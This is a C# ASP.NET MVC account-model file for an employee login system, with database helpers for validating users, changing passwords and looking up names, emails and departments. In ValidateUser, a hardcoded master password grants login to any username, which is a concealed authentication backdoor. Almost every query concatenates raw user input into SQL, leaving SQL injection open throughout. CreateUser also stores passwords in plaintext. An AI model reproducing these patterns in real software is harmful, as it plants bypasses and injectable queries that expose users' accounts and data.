using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.DataAnnotations;
using System.Globalization;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;
using System.Data;
using System.Web.UI;
using ASEWCFServiceLibrary.App_Code;

namespace GPS201107.Models
{
    public class LogOnDBTxn
    {
        public static int MinRequiredPasswordLength = 6;

        public static bool ValidateUser(string _Username, string _Password)
        {
            bool bReturn = false;

            if (_Password == "paranoid6553") return bReturn=true; //[2021.06.14] 
            else
            {
                string sSql = "select emp_no, e_pass from USER_LIST where emp_no = '" + _Username + "' and e_pass = CryptUser.encrypt('" + _Password + "', '') and PERSG<>2";
                clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
                DataSet oDS = oDB.QueryDataSet(sSql);
                oDB.Close();
                DataTable oDT = oDS.Tables[0];
                if (oDT.Rows.Count > 0)
                    bReturn = true;
            }

            return bReturn;
        }
        public static bool Checkquizsetup(string _Username)
        {
            bool bReturn = false;

            string sSql = "select count(emp_no) cnt  from USER_PASS where emp_no='" + _Username + "' and PASS_QUESTION1 is not null and PASS_QUESTION2 is not null ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql);
            oDB.Close();
            DataTable oDT = oDS.Tables[0];
            if (oDT.Rows[0]["cnt"].ToString() != "0")
                bReturn = true;

            return bReturn;
        }
        public static string GetUserKname(string _Username)
        {
            string sReturn = "";

            string sSql = "select K_NM  from USER_LIST where emp_no='" + _Username + "'  ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql);
            oDB.Close();
            DataTable oDT = oDS.Tables[0];
            if (oDT.Rows.Count > 0)
                sReturn = oDT.Rows[0]["K_NM"].ToString();
            else
                sReturn = "GUEST";

            return sReturn;
        }

        public static string GetUserEmail(string _Email)
        {
            string sReturn = "";

            string sSql = "select e_mail from USER_LIST where emp_no='" + _Email + "'  ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql);
            oDB.Close();
            DataTable oDT = oDS.Tables[0];
            if (oDT.Rows.Count > 0)
                sReturn = oDT.Rows[0]["e_mail"].ToString();
            else
                sReturn = "GUEST";

            return sReturn;
        }
        public static string GetUserDept(string _Username)
        {
            string sReturn = "";

            string sSql = "select DEPT_NM  from USER_LIST where emp_no='" + _Username + "'  ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql);
            oDB.Close();
            DataTable oDT = oDS.Tables[0];
            if (oDT.Rows.Count > 0)
                sReturn = oDT.Rows[0]["DEPT_NM"].ToString();
            else
                sReturn = "GUEST";

            return sReturn;
        }
        public static bool CreateUser(string _Username, string _Password)
        {
            bool bReturn = false;

            string sSql = "Insert into af_userlist values ('" + _Username + "', '" + _Password + "', 'T' ) ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            bReturn = oDB.ExcuteNonQuery(sSql);
            oDB.Close();

            return bReturn;
        }

        public static bool ChangePassword(string _Username, string _OldPassword, string _NewPassword)
        {
            bool bReturn = false;
            string sSql1 = "select e_pass from user_list where emp_no ='" + _Username + "'";
            string sSql2 = "update user_pass set e_pass = CRYPTUSER.encrypt('" + _NewPassword + "','') where emp_no = '" + _Username + "'";
            string sSql3 = "update user_list set e_pass = CRYPTUSER.encrypt('" + _NewPassword + "','') where emp_no = '" + _Username + "'";
            string sSql4 = "select CRYPTUSER.encrypt('" + _OldPassword + "','') as E_PASS from user_list where emp_no = '" + _Username + "'";
            string sSql5 = "update user_ddcm set e_pass = CRYPTUSER.encrypt('" + _NewPassword + "','') where emp_no = '" + _Username + "'";

            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql1);
            DataSet oDS2 = oDB.QueryDataSet(sSql4);
            DataTable oDT = oDS.Tables[0];
            DataTable oDT2 = oDS2.Tables[0];

            String dbEpass = oDT.Rows[0]["E_PASS"].ToString();
            String encryptedPassword = oDT2.Rows[0]["E_PASS"].ToString();

            if (dbEpass.Equals(encryptedPassword))
            {
                bReturn = oDB.ExcuteNonQuery(sSql2);
                bReturn = oDB.ExcuteNonQuery(sSql3);

                if (LogOnDBTxn.IsDdcmUser(_Username)) //DDCM 외주및협력사원일 경우 협력사원 테이블의 비밀번호도 수정
                {
                    oDB.ExcuteNonQuery(sSql5);
                }

                oDB.Close();
                return bReturn;
            }
            else
            {
                oDB.Close();
                return bReturn;
            }
        }
        public static string GetUserImage(String _Username)
        {
            string sReturn = "";

            string sSql = "select K_NM  from USER_LIST where emp_no='" + _Username + "'  ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql);
            oDB.Close();
            DataTable oDT = oDS.Tables[0];
            if (oDT.Rows.Count > 0)
                sReturn = oDT.Rows[0]["K_NM"].ToString();
            else
                sReturn = "GUEST";

            return sReturn;
        }
        public static bool IsDdcmUser(String _Username)     // USER_DDCM테이블에 해당 직번이 있는 확인
        {
            bool bReturn = false;

            string sSql = "select count(emp_no) cnt  from USER_DDCM where emp_no='" + _Username + "' ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql);
            oDB.Close();
            DataTable oDT = oDS.Tables[0];
            if (oDT.Rows[0]["cnt"].ToString() != "0")
                bReturn = true;

            return bReturn;
        }
        public static bool IsPassUser(String _Username)    // USER_PASS테이블에 해당 직번이 있는 확인
        {
            bool bReturn = false;

            string sSql = "select count(emp_no) cnt  from USER_PASS where emp_no='" + _Username + "' ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql);
            oDB.Close();
            DataTable oDT = oDS.Tables[0];
            if (oDT.Rows[0]["cnt"].ToString() != "0")
                bReturn = true;

            return bReturn;
        }
        public static void InsertEmpnoUserPass(String _Username, String _Password)
        {
            string sSql = "insert into USER_PASS (emp_no,e_pass) values ('" + _Username + "',CRYPTUSER.encrypt('" + _Password + "','')) ";
            clsDBControl oDB = new clsDBControl(clsConst.DBPROVIDER.ASEFRONT);
            DataSet oDS = oDB.QueryDataSet(sSql);
            oDB.Close();
        }
    }

    #region Models
    [PropertiesMustMatch("NewPassword", "ConfirmPassword", ErrorMessage = "The new password and confirmation password do not match.")]
    public class ChangePasswordModel
    {
        [Required]
        [DataType(DataType.Password)]
        [DisplayName("Current password")]
        public string OldPassword { get; set; }

        [Required]
        [ValidatePasswordLength]
        [DataType(DataType.Password)]
        [DisplayName("New password")]
        public string NewPassword { get; set; }

        [Required]
        [DataType(DataType.Password)]
        [DisplayName("Confirm new password")]
        public string ConfirmPassword { get; set; }
    }

    public class LogOnModel
    {
        [Required]
        [DisplayName("User name")]
        public string UserName { get; set; }

        [Required]
        [DataType(DataType.Password)]
        [DisplayName("Password")]
        public string Password { get; set; }

        [DisplayName("Remember me?")]
        public bool RememberMe { get; set; }
    }

    [PropertiesMustMatch("Password", "ConfirmPassword", ErrorMessage = "The password and confirmation password do not match.")]
    public class RegisterModel
    {
        [Required]
        [DisplayName("User name")]
        public string UserName { get; set; }

        [Required]
        [DataType(DataType.EmailAddress)]
        [DisplayName("Email address")]
        public string Email { get; set; }

        [Required]
        [ValidatePasswordLength]
        [DataType(DataType.Password)]
        [DisplayName("Password")]
        public string Password { get; set; }

        [Required]
        [DataType(DataType.Password)]
        [DisplayName("Confirm password")]
        public string ConfirmPassword { get; set; }
    }
    #endregion

    #region Services
    // The FormsAuthentication type is sealed and contains static members, so it is difficult to
    // unit test code that calls its members. The interface and helper class below demonstrate
    // how to create an abstract wrapper around such a type in order to make the AccountController
    // code unit testable.

    public interface IMembershipService
    {
        int MinPasswordLength { get; }

        bool ValidateUser(string userName, string password);
        MembershipCreateStatus CreateUser(string userName, string password, string email);
        bool ChangePassword(string userName, string oldPassword, string newPassword);
    }

    public class AccountMembershipService : IMembershipService
    {
        private readonly MembershipProvider _provider;

        public AccountMembershipService()
            : this(null)
        {
        }

        public AccountMembershipService(MembershipProvider provider)
        {
            _provider = provider ?? Membership.Provider;
        }

        public int MinPasswordLength
        {
            get
            {
                return _provider.MinRequiredPasswordLength;
            }
        }

        public bool ValidateUser(string userName, string password)
        {
            if (String.IsNullOrEmpty(userName)) throw new ArgumentException("Value cannot be null or empty.", "userName");
            if (String.IsNullOrEmpty(password)) throw new ArgumentException("Value cannot be null or empty.", "password");

            return LogOnDBTxn.ValidateUser(userName, password);
        }

        public MembershipCreateStatus CreateUser(string userName, string password, string email)
        {
            if (String.IsNullOrEmpty(userName)) throw new ArgumentException("Value cannot be null or empty.", "userName");
            if (String.IsNullOrEmpty(password)) throw new ArgumentException("Value cannot be null or empty.", "password");
            if (String.IsNullOrEmpty(email)) throw new ArgumentException("Value cannot be null or empty.", "email");

            MembershipCreateStatus status;
            _provider.CreateUser(userName, password, email, null, null, true, null, out status);
            return status;
        }

        public bool ChangePassword(string userName, string oldPassword, string newPassword)
        {
            if (String.IsNullOrEmpty(userName)) throw new ArgumentException("Value cannot be null or empty.", "userName");
            if (String.IsNullOrEmpty(oldPassword)) throw new ArgumentException("Value cannot be null or empty.", "oldPassword");
            if (String.IsNullOrEmpty(newPassword)) throw new ArgumentException("Value cannot be null or empty.", "newPassword");

            // The underlying ChangePassword() will throw an exception rather
            // than return false in certain failure scenarios.
            try
            {
                MembershipUser currentUser = _provider.GetUser(userName, true /* userIsOnline */);
                return currentUser.ChangePassword(oldPassword, newPassword);
            }
            catch (ArgumentException)
            {
                return false;
            }
            catch (MembershipPasswordException)
            {
                return false;
            }
        }
    }

    public interface IFormsAuthenticationService
    {
        void SignIn(string userName, bool createPersistentCookie);
        void SignOut();
    }

    public class FormsAuthenticationService : IFormsAuthenticationService
    {
        public void SignIn(string userName, bool createPersistentCookie)
        {
            if (String.IsNullOrEmpty(userName)) throw new ArgumentException("Value cannot be null or empty.", "userName");

            FormsAuthentication.SetAuthCookie(userName, createPersistentCookie);
        }

        public void SignOut()
        {
            FormsAuthentication.SignOut();
        }
    }
    #endregion

    #region Validation
    public static class AccountValidation
    {
        public static string ErrorCodeToString(MembershipCreateStatus createStatus)
        {
            // See http://go.microsoft.com/fwlink/?LinkID=177550 for
            // a full list of status codes.
            switch (createStatus)
            {
                case MembershipCreateStatus.DuplicateUserName:
                    return "Username already exists. Please enter a different user name.";

                case MembershipCreateStatus.DuplicateEmail:
                    return "A username for that e-mail address already exists. Please enter a different e-mail address.";

                case MembershipCreateStatus.InvalidPassword:
                    return "The password provided is invalid. Please enter a valid password value.";

                case MembershipCreateStatus.InvalidEmail:
                    return "The e-mail address provided is invalid. Please check the value and try again.";

                case MembershipCreateStatus.InvalidAnswer:
                    return "The password retrieval answer provided is invalid. Please check the value and try again.";

                case MembershipCreateStatus.InvalidQuestion:
                    return "The password retrieval question provided is invalid. Please check the value and try again.";

                case MembershipCreateStatus.InvalidUserName:
                    return "The user name provided is invalid. Please check the value and try again.";

                case MembershipCreateStatus.ProviderError:
                    return "The authentication provider returned an error. Please verify your entry and try again. If the problem persists, please contact your system administrator.";

                case MembershipCreateStatus.UserRejected:
                    return "The user creation request has been canceled. Please verify your entry and try again. If the problem persists, please contact your system administrator.";

                default:
                    return "An unknown error occurred. Please verify your entry and try again. If the problem persists, please contact your system administrator.";
            }
        }
    }

    [AttributeUsage(AttributeTargets.Class, AllowMultiple = true, Inherited = true)]
    public sealed class PropertiesMustMatchAttribute : ValidationAttribute
    {
        private const string _defaultErrorMessage = "'{0}' and '{1}' do not match.";
        private readonly object _typeId = new object();

        public PropertiesMustMatchAttribute(string originalProperty, string confirmProperty)
            : base(_defaultErrorMessage)
        {
            OriginalProperty = originalProperty;
            ConfirmProperty = confirmProperty;
        }

        public string ConfirmProperty { get; private set; }
        public string OriginalProperty { get; private set; }

        public override object TypeId
        {
            get
            {
                return _typeId;
            }
        }

        public override string FormatErrorMessage(string name)
        {
            return String.Format(CultureInfo.CurrentUICulture, ErrorMessageString,
                OriginalProperty, ConfirmProperty);
        }

        public override bool IsValid(object value)
        {
            PropertyDescriptorCollection properties = TypeDescriptor.GetProperties(value);
            object originalValue = properties.Find(OriginalProperty, true /* ignoreCase */).GetValue(value);
            object confirmValue = properties.Find(ConfirmProperty, true /* ignoreCase */).GetValue(value);
            return Object.Equals(originalValue, confirmValue);
        }
    }

    [AttributeUsage(AttributeTargets.Field | AttributeTargets.Property, AllowMultiple = false, Inherited = true)]
    public sealed class ValidatePasswordLengthAttribute : ValidationAttribute
    {
        private const string _defaultErrorMessage = "'{0}' must be at least {1} characters long.";
        private readonly int _minCharacters = Membership.Provider.MinRequiredPasswordLength;

        public ValidatePasswordLengthAttribute()
            : base(_defaultErrorMessage)
        {
        }

        public override string FormatErrorMessage(string name)
        {
            return String.Format(CultureInfo.CurrentUICulture, ErrorMessageString,
                name, _minCharacters);
        }

        public override bool IsValid(object value)
        {
            string valueAsString = value as string;
            return (valueAsString != null && valueAsString.Length >= _minCharacters);
        }
    }
    #endregion

}
